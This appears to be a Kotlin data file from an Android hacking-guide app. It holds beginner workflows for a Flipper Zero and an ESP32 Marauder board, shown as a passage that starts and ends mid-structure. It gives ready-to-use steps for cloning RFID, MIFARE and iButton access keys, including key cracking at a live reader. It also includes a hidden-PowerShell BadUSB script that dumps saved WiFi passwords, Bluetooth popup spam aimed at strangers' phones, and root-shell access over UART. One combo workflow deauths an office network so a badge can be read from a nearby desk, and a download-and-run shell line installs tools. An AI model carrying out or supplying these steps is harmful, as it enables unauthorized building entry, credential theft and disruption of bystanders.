                    title = "Hold Flipper to the Reader",
                    description = "Hold the BACK of your Flipper against the card reader exactly the same way you'd hold the real card. Keep it still for 1-2 seconds. The reader should beep green.",
                    tips = listOf(
                        "If it beeps red: try flipping Flipper around (other orientation)",
                        "If still failing: try pressing Flipper really close to the reader",
                        "Some readers are strict about distance — go as close as possible"
                    )
                )
            )
        ),

        Workflow(
            id = "rfid_clone",
            title = "Make a Physical Copy of an RFID Card",
            subtitle = "Write a cloned card ID to a blank T5577 card",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "T5577 blank card or fob (buy on Amazon for about $1 each)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read the Original Card First",
                    description = "Before cloning, you need to read and save the original card. Follow the 'Read an RFID Access Card' workflow above. Come back here once it's saved.",
                    tips = listOf("The card needs to be in your Saved list before you can clone it")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Get a T5577 Blank Card",
                    description = "You need a 'T5577 blank RFID card' (also sold as EM4305 blanks). Search Amazon for 'T5577 RFID blank cards'. A pack of 10 costs about $8. They look like regular access cards but are totally empty.",
                    tips = listOf(
                        "Get the keyfob format if you want to put it on a keyring",
                        "Works with EM4100, HID, and most other 125kHz card types"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Write to the Blank Card",
                    description = "Go to: 125 kHz RFID → Saved → your card → press OK → scroll to 'Write' → press OK.\n\nNow put the blank T5577 card flat on the BACK of your Flipper. Hold it very still. Flipper will vibrate when the write is complete.",
                    commands = listOf(
                        Command("Write to blank card", "125 kHz RFID → Saved → [card] → Write", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Flipper vibrates = success!",
                        "Test the clone right away at the reader to confirm it works"
                    )
                )
            )
        ),

        // ── NFC ────────────────────────────────────────────────────────────────

        Workflow(
            id = "nfc_read_mifare",
            title = "Read and Clone a NFC Access Card",
            subtitle = "Crack and clone MIFARE Classic cards (hotel, parking, elevator)",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target NFC card", "For physical clone: Magic Gen1a NFC card (buy on Amazon)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Kind of Card Is It?",
                    description = "This guide is for NFC cards — the thin plastic cards that work at high-tech readers (hotel rooms, elevators, modern office doors). They're different from 125kHz RFID:\n• If it's a thin hotel keycard → probably MIFARE Classic (this guide)\n• If it's a thick fob → probably 125kHz RFID (different guide)\n• Contactless bank cards → can read but cannot clone (too secure)",
                    tips = listOf("Still not sure? Try NFC → Read on Flipper — it'll tell you what type it is")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open NFC and Read",
                    description = "Press Flipper's middle button → scroll to 'NFC' → press OK → press OK on 'Read'. Now hold your NFC card flat on the BACK of Flipper (top area, near where the NFC label would be).",
                    commands = listOf(
                        Command("Start reading", "NFC → Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf("Hold the card very still for 3-5 seconds")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Flipper Tries to Crack It Automatically",
                    description = "Flipper has 1,241 built-in passwords baked in. It tries ALL of them automatically in a few seconds. You'll see a progress bar scanning through the card's sectors.\n\n✅ If all sectors turn green — full read! Save it and you're done.\n⚠️ If some sectors show '?????' — you need the next steps to get the missing keys.",
                    tips = listOf("Most common hotel keycards get fully read on the first try")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Get Missing Keys with Detect Reader",
                    description = "For any '?????' sectors: Go to NFC → Detect Reader. Then go to the REAL card reader (the one that accepts this card) and hold your Flipper where the card goes. The reader tries to authenticate with Flipper, and Flipper secretly records those authentication attempts.",
                    commands = listOf(
                        Command("Detect reader attack", "NFC → Detect Reader", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "You might need to do this 2-3 times near the same reader",
                        "The reader will usually beep or reject it — that's fine, Flipper already got what it needed"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Extract the Keys on Your Phone",
                    description = "Open the Flipper Mobile App on your phone. Go to Tools → Mfkey32. Tap 'Calculate'. The app looks at the captured authentication data and figures out the secret keys. This takes 1-3 minutes.",
                    tips = listOf(
                        "The recovered keys get saved to Flipper automatically",
                        "These keys work for any card from the same access control system"
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Read the Card Again",
                    description = "Go back to NFC → Read and hold the card on Flipper again. Now that Flipper knows the keys, all sectors should turn green. Save the complete card.",
                    tips = listOf("If there are still '?????' sectors, do the Detect Reader step again with those specific sectors")
                ),
                WorkflowStep(
                    stepNumber = 7,
                    title = "Emulate or Clone",
                    description = "OPTION A — Emulate (use Flipper as the card):\nNFC → Saved → [card name] → Emulate. Hold Flipper to reader.\n\nOPTION B — Write to a blank Magic card:\nNFC → Saved → [card name] → Write. Hold blank Magic Gen1a card to Flipper back. Works as a physical copy.",
                    commands = listOf(
                        Command("Emulate", "NFC → Saved → [name] → Emulate", Device.FLIPPER_CLI),
                        Command("Write to Magic card", "NFC → Saved → [name] → Write", Device.FLIPPER_CLI)
                    ),
                    tips = listOf("Magic Gen1a cards: search 'UID changeable MIFARE card' on Amazon — about $3 each")
                )
            )
        ),

        Workflow(
            id = "nfc_ntag",
            title = "Copy NFC Stickers and Amiibo Figures",
            subtitle = "Clone NTAG stickers, NFC business cards, and Nintendo Amiibo toys",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "For writing: blank NTAG215 sticker (get NTAG215 for Amiibo, or NTAG213 for simple tags)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read the NFC Tag",
                    description = "NFC → Read. Hold the tag or figure flat on the back of Flipper. These are much simpler than access cards — Flipper reads them instantly with no cracking needed.",
                    commands = listOf(
                        Command("Read tag", "NFC → Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "NTAG215 is what Nintendo Amiibo uses",
                        "Flipper shows all the data stored on the tag"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Save It",
                    description = "Press OK and give it a name. It's now saved on Flipper.",
                    tips = listOf("You can use Flipper to emulate Amiibos in games — it works perfectly")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Emulate (For Amiibo in Games)",
                    description = "NFC → Saved → [tag name] → Emulate. Tap Flipper to your Nintendo Switch just like you'd tap the real Amiibo. The game thinks it's the real thing.",
                    commands = listOf(
                        Command("Emulate", "NFC → Saved → [name] → Emulate", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Write to a Blank Tag",
                    description = "To make a physical copy: NFC → Saved → [tag name] → Write. Hold a blank NTAG sticker to the back of Flipper. It writes the copy in 2 seconds.",
                    tips = listOf(
                        "For Amiibo: must use NTAG215 blank stickers (not NTAG213!)",
                        "Search 'NTAG215 NFC stickers' on Amazon — about $10 for 20 pieces"
                    )
                )
            )
        ),

        // ── BADUSB ─────────────────────────────────────────────────────────────

        Workflow(
            id = "badusb_basic",
            title = "Run a Keyboard Hack (BadUSB)",
            subtitle = "Make Flipper type commands on any computer automatically",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "USB-C to USB-A cable (to plug Flipper into a computer)", "A script file (.txt) placed on Flipper's SD card"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "How This Works",
                    description = "When you plug Flipper into a computer via USB, the computer thinks it's a keyboard. Then Flipper 'types' commands super fast — way faster than any human. This is how hackers run code on locked computers.\n\nYou can download pre-made scripts or write your own.",
                    tips = listOf("Flipper shows up as a regular USB keyboard — no special software needed on the target computer")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Get a Script File",
                    description = "Scripts are simple .txt files written in 'DuckyScript' language. You can:\nA) Download pre-made ones from GitHub: github.com/I-Am-Jakoby/Flipper-Zero-BadUSB\nB) Write your own (see the DuckyScript section in Cheat Sheet tab)\n\nSave the .txt file to your phone.",
                    tips = listOf(
                        "The GitHub repo above has 50+ ready-to-use scripts",
                        "Scripts are just text files — open in any text editor to see what they do"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Copy Script to Flipper",
                    description = "Connect Flipper to your phone via USB. On your phone's file manager, go to Flipper's storage. Navigate to 'badusb' folder. Copy your .txt script file into this folder.",
                    commands = listOf(
                        Command("Script destination folder", "/ext/badusb/", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Load the Script on Flipper",
                    description = "On Flipper: press the middle button → scroll to 'Bad USB' → press OK → you'll see your script file listed → press OK on it.",
                    commands = listOf(
                        Command("Open BadUSB menu", "Main Menu → Bad USB → [your script]", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Plug Into Computer and Run",
                    description = "Plug Flipper into the TARGET computer via USB. Wait 2-3 seconds for the computer to recognize it. Then press OK on Flipper. Watch it type everything automatically.",
                    warning = "Only run this on computers you own or have written permission to test",
                    tips = listOf(
                        "DELAY 1000 at the start of scripts = wait 1 second (gives computer time to recognize Flipper)",
                        "If it types too fast: add DELAY commands between lines"
                    )
                )
            )
        ),

        Workflow(
            id = "badusb_wifi_grab",
            title = "Steal Saved WiFi Passwords (Windows)",
            subtitle = "Run a script that dumps all saved WiFi passwords to a file",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "USB cable", "A Windows PC (your own!)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Create the Script",
                    description = "On your phone or PC, create a new text file. Name it 'wifi_grab.txt'. Paste this exact text into it:",
                    commands = listOf(
                        Command(
                            "WiFi password grabber script",
                            "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"(netsh wlan show profiles) | Select-String 'All User Profile' | %{\$n=(\$_ -split ':')[1].Trim(); (netsh wlan show profile name=\$n key=clear)} | Select-String 'Key Content' | Out-File \$env:USERPROFILE\\Desktop\\wifi_passwords.txt\"\nENTER",
                            Device.PC
                        )
                    ),
                    tips = listOf(
                        "This script: opens Run dialog → runs a hidden PowerShell command → saves all WiFi passwords to Desktop/wifi_passwords.txt",
                        "Only works on Windows"
                    ),
                    warning = "Only run this on your own computer"
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Copy to Flipper and Run",
                    description = "Copy wifi_grab.txt to /ext/badusb/ on Flipper's SD card. Load it in BadUSB menu. Plug into Windows computer. Press OK.\n\nIn about 3 seconds, a file called 'wifi_passwords.txt' will appear on the computer's Desktop with all saved WiFi passwords.",
                    tips = listOf("The PowerShell window is hidden — you won't see it running")
                )
            )
        ),

        Workflow(
            id = "badusb_ble",
            title = "Run BadUSB Wirelessly (No Cable Needed)",
            subtitle = "Execute keyboard scripts over Bluetooth — no physical connection",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target computer has Bluetooth"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Turn On Flipper Bluetooth",
                    description = "Settings → Bluetooth → Bluetooth → ON",
                    commands = listOf(
                        Command("Enable BT", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Load Script in BLE Mode",
                    description = "Go to: Main Menu → Bad USB → select your script file. Then instead of just pressing OK to run it, look for the 'Connect via BT' option at the bottom. Select that.",
                    commands = listOf(
                        Command("Select BLE mode", "Bad USB → [script] → Connect via BT", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Pair with Target Computer",
                    description = "On the target computer, open Bluetooth settings. You'll see 'Flipper Keyboard' appear. Click 'Pair'. The computer now thinks Flipper is a Bluetooth keyboard.",
                    tips = listOf(
                        "Works up to about 30 feet away",
                        "You can be in another room!"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Run the Script",
                    description = "Once paired, press OK on Flipper. The script runs exactly the same as USB mode — but wirelessly.",
                    tips = listOf("The Flipper doesn't need to be near the computer once paired — just in Bluetooth range")
                )
            )
        ),

        // ── BLUETOOTH ──────────────────────────────────────────────────────────

        Workflow(
            id = "ble_spam",
            title = "Spam Bluetooth Notifications on Nearby Phones",
            subtitle = "Flood iPhones, Androids, and Windows devices with BLE popups",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
            prerequisites = listOf("Flipper Zero with Momentum firmware OR AWOK with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "BLE Spam on Flipper (Best Option)",
                    description = "On Flipper with Momentum firmware:\nApps → Bluetooth → BLE Spam\n\nPress OK to open it. You'll see a menu with different attack types.",
                    commands = listOf(
                        Command("Open BLE Spam", "Apps → Bluetooth → BLE Spam", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "This app is ONLY in Momentum/Unleashed firmware",
                        "Not available in stock official firmware"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Pick Your Target",
                    description = "Choose what kind of devices you want to annoy:\n• iOS: 'AirDrop Transfer' — makes iPhones show repeated AirDrop popups\n• iOS: 'AirPods Pairing' — fake AirPods pairing notifications on iPhones\n• Android: 'Android Fast Pair' — fake Google earbuds notifications\n• Windows: 'Nearby Share' — fake file sharing popups\n• Samsung: 'Galaxy Device' spam"
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run It",
                    description = "Select your attack type. Press OK. Flipper starts broadcasting and everyone nearby starts getting popups on their phone. They're harmless — just annoying.",
                    warning = "Don't use this in schools, hospitals, or anywhere it could cause distraction",
                    tips = listOf("Works within about 30 feet (Bluetooth range)")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "BLE Spam via AWOK (Alternative)",
                    description = "If you prefer using AWOK: open Marauder terminal and type 'blespam'. The AWOK has a stronger radio than Flipper so it covers more distance.",
                    commands = listOf(
                        Command("AWOK BLE spam", "blespam", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Double Spam — Both at Once",
                    description = "Run BLE Spam on Flipper AND type 'blespam' on AWOK at the same time. Now you have two different devices flooding the area with different spam packets simultaneously. Maximum chaos.",
                    tips = listOf("Flipper and AWOK can run independently at the same time")
                )
            )
        ),

        Workflow(
            id = "bt_scan",
            title = "Scan All Nearby Bluetooth Devices",
            subtitle = "Find every Bluetooth device in range — trackers, headphones, locks",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
            prerequisites = listOf("Flipper Zero AND/OR AWOK with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "BLE Scan on Flipper",
                    description = "On Flipper: Settings → Bluetooth → scroll to 'Scan' (or look for it in the BLE menu). Press OK. Flipper shows a live list of all Bluetooth Low Energy devices advertising nearby — with their names, MAC addresses, and signal strength.",
                    tips = listOf(
                        "BLE = Bluetooth Low Energy — used by earbuds, fitness trackers, smart locks, AirTags",
                        "You'll see exact model names like 'Galaxy Watch 4', 'Tile Mate', 'WH-1000XM5'"
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Find Hidden Trackers",
                    description = "If you see an unknown 'airtag' or 'tile' or 'SmartTag' device that keeps following you — this is how you'd find it. The scan reveals tracking devices that you might not know about.",
                    tips = listOf("AirTags show up as 'AirTag' or unnamed Apple devices")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Bluetooth Classic Scan via AWOK",
                    description = "For older Bluetooth Classic devices (not BLE): open Marauder terminal and type 'sniffbt'. This scans for classic Bluetooth devices like older speakers, keyboards, and phones.",
                    commands = listOf(
                        Command("Scan BT Classic", "sniffbt", Device.MARAUDER)
                    ),
                    tips = listOf("Save the PCAP file from the scan for later analysis")
                )
            )
        ),

        // ── INFRARED ───────────────────────────────────────────────────────────

        Workflow(
            id = "ir_learn",
            title = "Teach Flipper Any Remote Control",
            subtitle = "Copy any TV, AC, projector, or IR remote into Flipper",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "The original remote you want to copy"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Infrared",
                    description = "Main Menu → Infrared. This is where you teach Flipper remotes and replay them.",
                    commands = listOf(
                        Command("Open menu", "Main Menu → Infrared", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Learning a New Remote",
                    description = "Scroll to 'Learn New Remote'. Press OK. Type a name for this remote (like 'LivingRoom_TV'). Press OK.",
                    commands = listOf(
                        Command("Learn new remote", "Infrared → Learn New Remote", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Copy Each Button",
                    description = "Flipper says 'Point remote here and press a button'. Point your real remote at the front of your Flipper (the top end). Press one button. You'll see Flipper show 'Saved!' and ask you to name this button.\n\nRepeat for every button you want to copy.",
                    tips = listOf(
                        "Flipper's IR sensor is at the top edge of the device",
                        "Point the remote AT Flipper from about 6-12 inches away",
                        "Press the button once, clearly — don't hold it"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Send Buttons",
                    description = "To replay any button: Infrared → Saved Remotes → select your remote → scroll to button name → press OK → Send.\n\nPoint Flipper at the TV (or AC, projector, etc.) and the IR signal fires.",
                    commands = listOf(
                        Command("Send saved button", "Infrared → Saved Remotes → [remote] → [button] → Send", Device.FLIPPER_CLI)
                    )
                )
            )
        ),

        Workflow(
            id = "ir_universal",
            title = "Control Any TV (No Remote Needed)",
            subtitle = "Use Flipper's built-in universal remote database — works on 95% of TVs",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Universal Remotes",
                    description = "Infrared → Universal Remotes. You'll see categories: TV, Audio, AC, Fan, Projector.",
                    commands = listOf(
                        Command("Universal remotes", "Infrared → Universal Remotes", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Try Power Brute Force",
                    description = "Select 'TV'. Then select 'TV Power Brute Force'. Point Flipper at the TV and press OK. Flipper cycles through EVERY power code for every TV brand ever made. When it hits the right one, the TV turns on or off.",
                    tips = listOf(
                        "Works even if you don't know the TV brand",
                        "Takes about 1-2 minutes to cycle through all brands",
                        "Once you see it respond, quickly press back to stop cycling — you found the right code"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Use Specific Brand Buttons",
                    description = "After power brute force finds the right brand, go back and select that brand specifically. Now you can use Vol+, Vol-, Mute, Input, etc.",
                    tips = listOf(
                        "Samsung, LG, Sony, Vizio, TCL, Hisense, Panasonic — all in there",
                        "If you know the brand: skip brute force and just select the brand directly"
                    )
                )
            )
        ),

        // ── iBUTTON ────────────────────────────────────────────────────────────

        Workflow(
            id = "ibutton_read",
            title = "Copy a Metal Contact Key (iButton)",
            subtitle = "Clone Dallas iButton keys used in Russian intercoms and some access systems",
            categoryId = "ibutton",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "The iButton key to copy", "Optional: blank iButton to write a physical copy"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is an iButton?",
                    description = "iButtons are small metal discs (like a battery) used as keys — you touch them to a reader to open a door. Very common in Russian apartment buildings and some older US systems. Flipper has a special contact point to read them.",
                    tips = listOf("Look for a small metal disc, usually on a keychain, that you touch to a black circular reader")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open iButton on Flipper",
                    description = "Main Menu → iButton → Read",
                    commands = listOf(
                        Command("Open menu", "Main Menu → iButton → Read", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Touch Key to Flipper",
                    description = "Look at the BOTTOM-LEFT corner of your Flipper. There's a small metal square contact point. Touch the iButton key FIRMLY to that metal square. Keep it in contact for 2-3 seconds.",
                    tips = listOf(
                        "The bottom-left metal contacts are called the 'TM connector'",
                        "You need firm metal-to-metal contact — press gently"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Save and Emulate",
                    description = "Flipper shows the key type and ID. Press OK to save. Name it.\n\nTo use Flipper AS the key: iButton → Saved → [key name] → Emulate. Touch Flipper's bottom-left contacts to the reader.",
                    commands = listOf(
                        Command("Emulate key", "iButton → Saved → [name] → Emulate", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Write to a Blank iButton (Physical Copy)",
                    description = "To make a physical copy: iButton → Saved → [key name] → Write. Touch a blank DS1990A iButton to Flipper's bottom-left contacts. Flipper writes the key in 1 second.",
                    tips = listOf(
                        "Blank DS1990A iButtons: search Amazon for 'DS1990A blank iButton' — about $5 for 5 pieces",
                        "The physical copy works on the actual door just like the original"
                    )
                )
            )
        ),

        // ── GPIO ───────────────────────────────────────────────────────────────

        Workflow(
            id = "gpio_uart",
            title = "Hack a Device's Serial Console via GPIO",
            subtitle = "Use Flipper as a UART bridge to access router and device consoles",
            categoryId = "gpio",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Jumper wires", "Target device with exposed UART pins (look for TX, RX, GND labels)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is UART?",
                    description = "UART is a serial communication port that many devices (routers, cameras, printers) have exposed on their circuit board. If you connect to it during boot, you can get a root shell (command line) on the device — even without knowing the password.",
                    tips = listOf("Look for 3-4 small pins labeled TX, RX, GND, VCC on circuit boards")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Wire It Up",
                    description = "Connect jumper wires between your device and Flipper's GPIO pins:\n• Target TX → Flipper PIN 14 (RX)\n• Target RX → Flipper PIN 13 (TX)\n• Target GND → Flipper GND (any GND pin)\n\nDO NOT connect the 5V/3.3V pins unless you're sure the target is off.",
                    commands = listOf(
                        Command("Wiring guide", "Target TX → Flipper Pin 14\nTarget RX → Flipper Pin 13\nTarget GND → Flipper GND", Device.FLIPPER_CLI)
                    ),
                    warning = "Use 3.3V logic only. 5V signals can destroy Flipper's GPIO pins"
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Open the UART Bridge App",
                    description = "On Flipper: Apps → GPIO → USB-UART Bridge. This turns Flipper into a USB-to-serial converter.",
                    commands = listOf(
                        Command("Open bridge app", "Apps → GPIO → USB-UART Bridge", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Connect Flipper to Your Phone",
                    description = "Plug Flipper into your phone via USB-C OTG adapter. Install 'Serial USB Terminal' from Google Play (it's free). Open it. Tap Connect. Set baud rate to 115200 (most common) or 9600.",
                    tips = listOf("The app: 'Serial USB Terminal' by Kai Morich — works great, free")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Reboot Target and Watch",
                    description = "Power cycle the target device. Watch the terminal — you should see boot messages scrolling. On many routers and cameras, just pressing Enter at the right moment gives you a root shell.",
                    tips = listOf(
                        "Try pressing Enter repeatedly during boot",
                        "Look for 'login:' prompt — default credentials are often admin/admin or root/root",
                        "Some devices drop right into a root shell with no password!"
                    )
                )
            )
        ),

        Workflow(
            id = "awok_flipper_combo",
            title = "Full Combo Attack: AWOK + Flipper Together",
            subtitle = "Use both devices simultaneously for a layered wireless attack",
            categoryId = "gpio",
            hardware = listOf(Hardware.BOTH),
            prerequisites = listOf("Flipper Zero with Momentum firmware", "AWOK Dual Mini v3 with Marauder", "AWOK connected to Flipper or phone"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "The Combo Strategy",
                    description = "Here's the power of having both devices:\n\n🔵 AWOK handles: WiFi attacks, BLE spam, Bluetooth scanning\n🟠 Flipper handles: Sub-GHz, RFID, NFC, BadUSB, IR, iButton\n\nRun them at the same time for multi-layer attacks. Example: Flipper does BadUSB on a laptop while AWOK captures the WiFi handshake simultaneously.",
                    tips = listOf("The devices are completely independent — they can run different attacks at the same time")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Connect AWOK to Flipper",
                    description = "Plug your AWOK into the Flipper's GPIO header (stacking connection) OR have AWOK plugged into your phone directly. Open Flipper → Apps → GPIO → [ESP32] WiFi Marauder to control AWOK through Flipper.",
                    commands = listOf(
                        Command("Control AWOK through Flipper", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Example: WiFi + BadUSB Attack",
                    description = "SIMULTANEOUS ATTACK:\n1. On Flipper: load a BadUSB script and plug into target PC\n2. In WiFi Marauder (via Flipper or phone): run 'scanap' on the target's network\n3. While BadUSB runs on the PC, AWOK captures the network handshake\n\nResult: you get both keyboard-level access AND network capture at the same time.",
                    warning = "Only perform on your own equipment"
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Example: BLE Spam + Sub-GHz Jam",
                    description = "CHAOS MODE:\n1. Flipper: BLE Spam app flooding iOS/Android with notifications\n2. AWOK: blespam command also running\n3. Also play with Flipper Sub-GHz to intercept any RF signals in the area\n\nAll running at the same time from the same setup.",
                    commands = listOf(
                        Command("AWOK BLE spam", "blespam", Device.MARAUDER),
                        Command("Flipper BLE Spam", "Apps → Bluetooth → BLE Spam", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Example: RFID + Deauth Distraction",
                    description = "SOCIAL ENGINEERING:\n1. AWOK: run deauth on the target office's WiFi (causes brief distraction/IT alert)\n2. Flipper: while they're distracted, swipe an RFID badge from a nearby desk and read it\n\nThe WiFi disruption = everyone's looking at their laptop → easier to get near a badge.",
                    warning = "This combination workflow is for authorized red team testing only"
                )
            )
        ),

        // ── FLIPPER RPC ────────────────────────────────────────────────────────

        Workflow(
            id = "rpc_connect",
            title = "Control Flipper via Bluetooth from PenThis!",
            subtitle = "Connect and send commands to Flipper wirelessly from the app",
            categoryId = "connect",
            hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("Flipper Zero with Bluetooth ON", "PenThis! app"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Turn On Flipper Bluetooth",
                    description = "Settings → Bluetooth → Bluetooth → ON",
                    commands = listOf(
                        Command("Enable BT", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Scan from PenThis!",
                    description = "In this PenThis! app, tap the 'Connect Flipper' section in the left menu. Tap 'Scan for Flipper'. Your Flipper will appear in the list as 'Flipper [name]'. Tap it.",
                    tips = listOf("Make sure your phone's Bluetooth is on and you've given the app Bluetooth permission")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Connect",
                    description = "Tap your Flipper in the list. The app connects via Bluetooth. You'll see the status change to Connected.",
                    tips = listOf("First connection may take 5-10 seconds")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Available Commands",
                    description = "Once connected, you can:\n• Ping — check if Flipper is responding\n• Device Info — see firmware version and device details\n• Reboot — remotely restart Flipper\n\nMore commands coming in future updates!",
                    commands = listOf(
                        Command("Ping Flipper", "Tap Ping button in app", Device.ANDROID),
                        Command("Get device info", "Tap Device Info in app", Device.ANDROID)
                    )
                )
            )
        ),

        // ── TOOLS ──────────────────────────────────────────────────────────────

        Workflow(
            id = "tools_nethunter",
            title = "Install Kali Linux on Your Phone",
            subtitle = "Get a full Kali Linux hacking environment in Termux — no root needed",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Android phone", "8GB free storage", "Good WiFi connection (8GB download)", "Termux from F-Droid"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install Termux from F-Droid",
                    description = "Do NOT install Termux from Google Play — that version is outdated. Instead:\n1. Open your browser and go to: f-droid.org\n2. Tap 'Download F-Droid' and install the F-Droid app\n3. Open F-Droid, search for 'Termux', install it\n\nTermux is a Linux terminal that runs on Android.",
                    tips = listOf("F-Droid = like an app store for open-source apps — totally safe")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Setup Storage Access",
                    description = "Open Termux. Type this and press Enter:\ntermux-setup-storage\n\nA permission popup will appear — tap 'Allow'. This lets Termux read your SD card and Downloads folder.",
                    commands = listOf(
                        Command("Allow storage access", "termux-setup-storage", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Update Everything",
                    description = "Type this and press Enter. Wait for it to finish (may take a few minutes):",
                    commands = listOf(
                        Command("Update packages", "pkg update && pkg upgrade -y", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Install Kali NetHunter Rootless",
                    description = "Type this entire line and press Enter:",
                    commands = listOf(
                        Command("Install NetHunter", "pkg install wget curl -y && wget -O install-nethunter-termux https://offs.ec/2MceZWr && bash install-nethunter-termux", Device.TERMUX)
                    ),
                    tips = listOf(
                        "This downloads 8GB of Kali Linux tools — use WiFi!",
                        "Takes 20-40 minutes",
                        "When it asks what to install: choose 'full' for everything",
                        "You can use your phone normally during download"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Launch Kali",
                    description = "When installation finishes, type 'nethunter' and press Enter. You're now running Kali Linux on your Android phone!",
                    commands = listOf(
                        Command("Start Kali", "nethunter", Device.TERMUX)
                    )
                ),
                WorkflowStep(
